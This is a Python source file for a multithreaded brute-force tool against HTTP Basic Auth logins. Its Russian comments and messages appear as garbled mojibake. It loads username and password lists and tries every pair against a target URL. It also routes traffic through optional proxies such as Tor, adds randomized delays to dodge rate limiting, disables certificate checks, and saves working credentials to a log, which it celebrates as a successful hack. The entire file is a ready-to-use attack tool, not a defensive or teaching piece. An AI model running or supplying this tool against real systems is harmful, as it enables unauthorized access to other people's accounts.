import requests
from requests.auth import HTTPBasicAuth
import concurrent.futures
from argparse import ArgumentParser
import time
import logging
from tqdm import tqdm
import random

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("success.log"),
        logging.StreamHandler()
    ]
)

def solve_simple_captcha(captcha_url):
    """–ü—Ä–æ—Å—Ç–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –∫–∞–ø—á–∏ (–µ—Å–ª–∏ –æ–Ω–∞ –≤ –≤–∏–¥–µ —Ç–µ–∫—Å—Ç–∞)"""
    try:
        response = requests.get(captcha_url, verify=False)
        if response.status_code == 200:
            # –ü—Ä–∏–º–µ—Ä: –∫–∞–ø—á–∞ ‚Äî —ç—Ç–æ –ø—Ä–æ—Å—Ç–æ —Ç–µ–∫—Å—Ç (–Ω–∞–ø—Ä–∏–º–µ—Ä, '12345')
            return response.text.strip()
    except:
        pass
    return None

def try_credentials(target_url, username, password, proxy=None, delay=0, captcha_url=None):
    proxies = None
    if proxy:
        proxies = {
            "http": proxy,
            "https": proxy,
        }
    
    try:
        # –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏
        if delay > 0:
            time.sleep(delay + random.uniform(-0.5, 0.5))  # –°–ª—É—á–∞–π–Ω—ã–π —Ä–∞–∑–±—Ä–æ—Å
            
        # –ï—Å–ª–∏ –µ—Å—Ç—å –∫–∞–ø—á–∞, —Å–Ω–∞—á–∞–ª–∞ –ø–æ–ª—É—á–∞–µ–º –µ—ë
        captcha_solution = None
        if captcha_url:
            captcha_solution = solve_simple_captcha(captcha_url)
            if not captcha_solution:
                logging.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å —Ä–µ—à–∏—Ç—å –∫–∞–ø—á—É –¥–ª—è {username}:{password}")
                return False
        
        # –§–æ—Ä–º–∏—Ä—É–µ–º –∑–∞–ø—Ä–æ—Å
        session = requests.Session()
        if captcha_solution:
            session.headers.update({"X-Captcha-Response": captcha_solution})
        
        response = session.get(
            target_url,
            auth=HTTPBasicAuth(username, password),
            proxies=proxies,
            timeout=15,
            verify=False
        )
        
        if response.status_code == 200:
            logging.info(f"‚úÖ –£—Å–ø–µ—Ö! {username}:{password} | –û—Ç–≤–µ—Ç: {response.text[:50]}...")
            return True
        else:
            logging.debug(f"‚ùå –ù–µ–≤–µ—Ä–Ω–æ: {username}:{password} (Status: {response.status_code})")
            return False
    except Exception as e:
        logging.error(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –¥–ª—è {username}:{password} -> {str(e)}")
        return False

def main():
    parser = ArgumentParser(description="Advanced Basic Auth Bruteforcer")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://example.com)")
    parser.add_argument("-U", "--user", help="Single username")
    parser.add_argument("-P", "--pass", help="Single password")
    parser.add_argument("-Uf", "--userfile", help="File with usernames (one per line)")
    parser.add_argument("-Pf", "--passfile", help="File with passwords (one per line)")
    parser.add_argument("-p", "--proxy", help="Proxy (e.g., http://127.0.0.1:8080, socks5://127.0.0.1:9050)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests (seconds)")
    parser.add_argument("-c", "--captcha", help="URL to fetch CAPTCHA (if applicable)")
    
    args = parser.parse_args()
    
    # –ó–∞–≥—Ä—É–∑–∫–∞ –ª–æ–≥–∏–Ω–æ–≤ –∏ –ø–∞—Ä–æ–ª–µ–π
    usernames = []
    passwords = []
    
    if args.user:
        usernames.append(args.user)
    elif args.userfile:
        with open(args.userfile, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
    
    if getattr(args, "pass"):
        passwords.append(getattr(args, "pass"))
    elif args.passfile:
        with open(args.passfile, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    
    if not usernames or not passwords:
        logging.error("–£–∫–∞–∂–∏—Ç–µ –ª–æ–≥–∏–Ω—ã –∏ –ø–∞—Ä–æ–ª–∏!")
        return
    
    logging.info(f"üîé –¶–µ–ª—å: {args.url}")
    logging.info(f"üë• –õ–æ–≥–∏–Ω–æ–≤: {len(usernames)}, üîë –ü–∞—Ä–æ–ª–µ–π: {len(passwords)}")
    logging.info(f"‚ö° –ü–æ—Ç–æ–∫–æ–≤: {args.threads}")
    if args.proxy:
        logging.info(f"üîÑ –ü—Ä–æ–∫—Å–∏: {args.proxy}")
    if args.delay > 0:
        logging.info(f"‚è≥ –ó–∞–¥–µ—Ä–∂–∫–∞: {args.delay} —Å–µ–∫")
    if args.captcha:
        logging.info(f"ü§ñ –ö–∞–ø—á–∞: {args.captcha}")
    
    # –û–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫
    total_attempts = len(usernames) * len(passwords)
    progress_bar = tqdm(total=total_attempts, desc="Bruteforcing", unit="attempt")
    
    # –ú–Ω–æ–≥–æ–ø–æ—Ç–æ—á–Ω—ã–π –±—Ä—É—Ç—Ñ–æ—Ä—Å
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for user in usernames:
            for pwd in passwords:
                futures.append(
                    executor.submit(
                        try_credentials,
                        args.url,
                        user,
                        pwd,
                        args.proxy,
                        args.delay,
                        args.captcha
                    )
                )
        
        success = False
        for future in concurrent.futures.as_completed(futures):
            progress_bar.update(1)
            if future.result():
                success = True
                executor.shutdown(wait=False)
                for f in futures:
                    f.cancel()
                break
    
    progress_bar.close()
    if success:
        logging.info("üéâ –£—Å–ø–µ—à–Ω—ã–π –≤–∑–ª–æ–º! –†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ success.log")
    else:
        logging.warning("üò¢ –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–æ–±—Ä–∞—Ç—å —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ.")

if __name__ == "__main__":
    main()